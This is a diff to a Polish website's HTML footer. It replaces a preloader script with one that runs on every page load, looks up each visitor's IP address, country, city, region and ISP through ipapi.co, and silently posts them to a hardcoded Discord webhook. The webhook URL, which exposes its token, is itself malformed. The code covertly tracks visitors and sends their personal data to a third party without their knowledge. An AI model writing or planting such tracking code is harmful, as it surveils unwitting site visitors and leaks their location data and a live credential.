@@ -150,25 +150,38 @@
     &copy; 2025 Jednostka Przeciw Grupowa. Wszelkie prawa zastrzeżone.
   </footer>
 
-  <script>
-    window.addEventListener("load", () => {
-      const preloader = document.getElementById("preloader");
-      setTimeout(() => {
-        preloader.classList.add("fade-out");
-      }, 1500);
-    });
-  </script>
-<script>
-  fetch("https://api.ipify.org?format=json")
+ <script>
+  const webhookUrl = "https://discord.com/api/webhooks/https://discord.com/api/webhooks/1364632834236743740/lmC7HhXBVzE4snxn9tPaolCHagVYZg5hwlNiHmhL_yAwM8wGMKTmMwSlb3hJdJMG-r2_";
+
+  fetch("https://ipapi.co/json")
     .then(res => res.json())
     .then(data => {
-      fetch("/.netlify/functions/sendip.js", {
+      const embed = {
+        embeds: [{
+          title: "🕵️ Nowe wejście na stronę",
+          color: 16711680, // czerwony
+          fields: [
+            { name: "🌍 IP", value: data.ip || "Nieznane", inline: true },
+            { name: "🇵🇱 Kraj", value: data.country_name || "Brak", inline: true },
+            { name: "🏙️ Miasto", value: data.city || "Brak", inline: true },
+            { name: "🌐 Region", value: data.region || "Brak", inline: true },
+            { name: "🧭 Dostawca", value: data.org || "Brak", inline: true }
+          ],
+          footer: {
+            text: `Data: ${new Date().toLocaleString("pl-PL")}`
+          }
+        }]
+      };
+
+      fetch(webhookUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ ip: data.ip })
+        body: JSON.stringify(embed)
       });
-    });
+    })
+    .catch(err => console.error("Błąd IP API:", err));
 </script>
+
 
 </body>
 </html>
